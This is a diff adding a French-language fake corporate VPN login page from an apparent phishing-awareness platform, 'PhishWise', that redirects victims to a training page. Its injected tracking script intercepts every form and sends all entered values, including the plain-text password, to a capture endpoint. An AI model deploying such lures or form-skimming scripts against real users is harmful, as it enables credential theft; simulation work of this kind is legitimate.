@@ -1,0 +1,440 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion VPN d'Entreprise</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1a202c; /* Dark background for corporate feel */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #e2e8f0;
+        }
+        .login-container {
+            background-color: #2d3748; /* Darker grey for container */
+            border-radius: 12px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            border: 1px solid #4a5568;
+        }
+        .logo {
+            margin-bottom: 30px;
+        }
+        .logo svg {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            color: #63b3ed; /* Blue for VPN icon */
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #ffffff;
+        }
+        p {
+            font-size: 16px;
+            color: #a0aec0;
+            margin-bottom: 30px;
+        }
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #e2e8f0;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            background-color: #4a5568; /* Dark input background */
+            border: 1px solid #6b7280;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #e2e8f0;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #63b3ed;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px 20px;
+            background-color: #63b3ed; /* Blue button */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #4299e1;
+        }
+        button:disabled {
+            background-color: #6b7280;
+            cursor: not-allowed;
+        }
+        .support-link {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+        .support-link a {
+            color: #63b3ed;
+            text-decoration: none;
+        }
+        .support-link a:hover {
+            text-decoration: underline;
+        }
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            display: none;
+        }
+    </style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.mx-auto{margin-left:auto;margin-right:auto}</style></head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <!-- VPN icon -->
+            <svg class="mx-auto" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                <path d="M2 17l10 5 10-5"></path>
+                <path d="M2 12l10 5 10-5"></path>
+            </svg>
+        </div>
+        <h1>Accès VPN Sécurisé</h1>
+        <p>Connectez-vous pour accéder au réseau interne de l'entreprise.</p>
+        
+        <form id="loginForm">
+            <label for="username">Nom d'utilisateur</label>
+            <input type="text" id="username" name="username" placeholder="Votre nom d'utilisateur" required="">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" name="password" placeholder="Votre mot de passe" required="">
+            <button type="submit" id="loginButton">
+                <div class="loading-spinner" id="loadingSpinner"></div>
+                <span id="buttonText">Se connecter au VPN</span>
+                <span class="loading-text" id="loadingText">Connexion...</span>
+            </button>
+        </form>
+        
+        <div class="support-link">
+            <a href="#">Besoin d'aide ? Contactez le support informatique.</a>
+        </div>
+    </div>
+
+    <script>
+        // Récupération des données de phishing
+        function getPhishingData() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const pathParts = window.location.pathname.split('/');
+            
+            // Campaign ID depuis le path /phishing/CAMPAIGN_ID
+            const campaignId = pathParts[2];
+            
+            // Email depuis plusieurs sources possibles
+            let targetEmail = null;
+            
+            // Source 1: Paramètres URL
+            if (urlParams.get('email')) {
+                targetEmail = urlParams.get('email');
+                console.log('📧 Email trouvé dans URL params:', targetEmail);
+            }
+            
+            // Source 2: Session de phishing injectée
+            if (!targetEmail && window.PHISHING_SESSION && window.PHISHING_SESSION.targetEmail) {
+                targetEmail = window.PHISHING_SESSION.targetEmail;
+                console.log('📧 Email trouvé dans session phishing:', targetEmail);
+            }
+            
+            // Source 3: Token dans session
+            const token = urlParams.get('token') || (window.PHISHING_SESSION && window.PHISHING_SESSION.token);
+            
+            console.log('📊 Données extraites:', { campaignId, targetEmail, token });
+            
+            return { campaignId, targetEmail, token };
+        }
+
+        // Gestionnaire de soumission du formulaire
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const { campaignId, targetEmail, token } = getPhishingData();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const button = document.getElementById('loginButton');
+            const buttonText = document.getElementById('buttonText');
+            const loadingText = document.getElementById('loadingText');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+
+            // VALIDATION CRITIQUE
+            if (!campaignId) {
+                console.error('❌ ERREUR: Campaign ID manquant'); 
+                return;
+            }
+
+            if (!targetEmail) {
+                console.error('❌ ERREUR: Email cible manquant'); 
+                return;
+            }
+
+            if (!username || !password) { 
+                return;
+            }
+
+            console.log('🎯 Soumission VPN avec:', { campaignId, targetEmail, username: username.substring(0, 3) + '***' });
+
+            // Animation de chargement
+            button.disabled = true;
+            buttonText.style.display = 'none';
+            loadingText.style.display = 'inline';
+            loadingSpinner.style.display = 'inline-block';
+
+            // Données de phishing
+            const phishingData = {
+                campaignId: campaignId,
+                targetEmail: targetEmail,
+                timestamp: new Date().toISOString(),
+                triggerType: 'form_submission',
+                pageType: 'vpn_login',
+                formData: {
+                    username: username,
+                    password: '***HIDDEN***'
+                },
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer,
+                token: token || 'direct-access'
+            };
+
+            // URL de capture
+            const captureUrl = `/api/phishing/${campaignId}/capture`;
+            console.log('📊 Envoi vers:', captureUrl);
+
+            fetch(captureUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(phishingData)
+            })
+            .then(response => {
+                console.log('📊 Status capture:', response.status);
+                if (!response.ok) {
+                    throw new Error(`Erreur HTTP: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('✅ Capture réussie:', data);
+                
+                // URL de redirection robuste
+                let trainingUrl;
+                if (data.redirectUrl) {
+                    trainingUrl = data.redirectUrl;
+                } else {
+                    trainingUrl = `/training/${campaignId}?email=${encodeURIComponent(targetEmail)}`;
+                    if (token) {
+                        trainingUrl += `&token=${token}`;
+                    }
+                }
+                
+                console.log('🔄 Redirection vers:', trainingUrl);
+                
+                setTimeout(() => {
+                    window.location.href = trainingUrl;
+                }, 1500);
+            })
+            .catch(error => {
+                console.warn('⚠️ Erreur capture:', error);
+                
+                // Redirection de secours même en cas d'erreur
+                let fallbackUrl = `/training/${campaignId}?email=${encodeURIComponent(targetEmail)}`;
+                if (token) {
+                    fallbackUrl += `&token=${token}`;
+                }
+                
+                console.log('🔄 Redirection de secours vers:', fallbackUrl);
+                
+                setTimeout(() => {
+                    window.location.href = fallbackUrl;
+                }, 1500);
+            });
+        });
+
+        // Validation à l'initialisation
+        document.addEventListener('DOMContentLoaded', function() {
+            const { campaignId, targetEmail, token } = getPhishingData();
+            
+            console.log('🏁 Page VPN initialisée');
+            console.log('🏷️ Campaign:', campaignId);
+            console.log('📧 Email:', targetEmail);
+            console.log('🎫 Token:', token);
+            console.log('🌐 URL:', window.location.href);
+            
+            if (!campaignId) {
+                console.error('❌ Campaign ID manquant à l\'initialisation'); 
+                return;
+            }
+        });
+
+        // Debug global
+        window.debugPhishingPage = function() {
+            const data = getPhishingData();
+            console.table(data);
+            console.log('Session:', window.PHISHING_SESSION);
+            console.log('URL complète:', window.location.href);
+            return data;
+        };
+
+        console.log('✅ Script VPN avec redirection chargé');
+    </script>
+
+
+
+    <script>
+      (function() {
+        // Custom alert function to replace native alert()
+        window.customAlert = function(message) {
+          console.log('Custom Alert:', message);
+          // You can implement a more sophisticated modal/message box here if needed.
+          // For now, it just logs to console.
+          // Example: alert(message); // If you still want the native alert for simulation
+        };
+
+        console.log('🎯 PhishWise Universal Tracking activated');
+
+        // Wait for DOM to be ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initTracking);
+        } else {
+          initTracking();
+        }
+
+        function initTracking() {
+          // Intercept all forms
+          const forms = document.querySelectorAll('form');
+          console.log('📝 Forms detected:', forms.length);
+
+          forms.forEach(function(form, index) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+              console.log('📋 Form submission intercepted:', index);
+
+              // Collect all form data
+              const formData = new FormData(form);
+              const data = {};
+
+              // Extract data from inputs
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
+              const inputs = form.querySelectorAll('input, select, textarea');
+              inputs.forEach(function(input) {
+                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
+                  if (input.type === 'checkbox' || input.type === 'radio') {
+                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
+                  } else {
+                    data[input.name] = input.value;
+                  }
+                }
+              });
+
+              // Tracking metadata
+              data._campaignId = '68b0d81af4b3de7a699d36bd';
+              data._timestamp = new Date().toISOString();
+              data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+              data._formIndex = index;
+              data._formAction = form.action || 'N/A';
+              data._formMethod = form.method || 'GET';
+
+              console.log('📊 Collected data:', data);
+
+              // Send data
+              fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+              }).then(function(response) {
+                console.log('✅ Data sent successfully');
+                // Redirect to learning page
+                window.location.href = 'http://localhost:3000/learning/68b0d81af4b3de7a699d36bd';
+              }).catch(function(error) {
+                console.error('❌ Error sending data:', error);
+                // Redirect even on error
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/68b0d81af4b3de7a699d36bd';
+                }, 1000);
+              });
+            });
+          });
+
+          // Track link clicks
+          document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (link) {
+              const href = link.href;
+              console.log('🔗 Link clicked:', href);
+
+              // Send click event
+              fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '68b0d81af4b3de7a699d36bd',
+                  clickedUrl: href,
+                  linkText: link.textContent.trim(),
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+            }
+          });
+
+          // Track input field interactions (focus)
+          const inputs = document.querySelectorAll('input, textarea, select');
+          inputs.forEach(function(input) {
+            input.addEventListener('focus', function() {
+              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
+            });
+          });
+
+          console.log('🚀 Universal tracking initialized');
+        }
+      })();
+    </script>
+</body></html>
